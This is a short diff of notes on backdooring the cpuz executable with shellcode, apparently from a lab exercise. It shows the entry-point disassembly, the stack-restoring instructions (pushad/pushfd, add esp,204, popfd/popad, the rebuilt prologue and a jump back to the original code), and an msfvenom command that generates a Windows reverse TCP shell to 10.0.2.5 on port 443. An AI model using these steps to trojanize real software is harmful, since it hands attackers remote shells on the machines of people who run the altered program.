@@ -6,14 +6,21 @@
 00407279  |. 68 58E24100    PUSH cpuz.0041E258
 0040727E  |. 68 40704000    PUSH cpuz.00407040                       ;  SE handler installation
 
-Before our shellcode, esp is at 0012FFA0
-
-After shellcode, esp is at 0012FD9C
-
-difference
-
-: 204
-
+.
+.
+.
+.
+pushad
+pushfd
+check esp : Before our shellcode, esp is at 0012FFA0
+After shellcode, esp is at 0012FD9C ,difference: 204
+add esp,204
+popfd
+popad
+push ebp
+mov ebp,esp
+push -1
+jmp 00407279
 
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -f hex
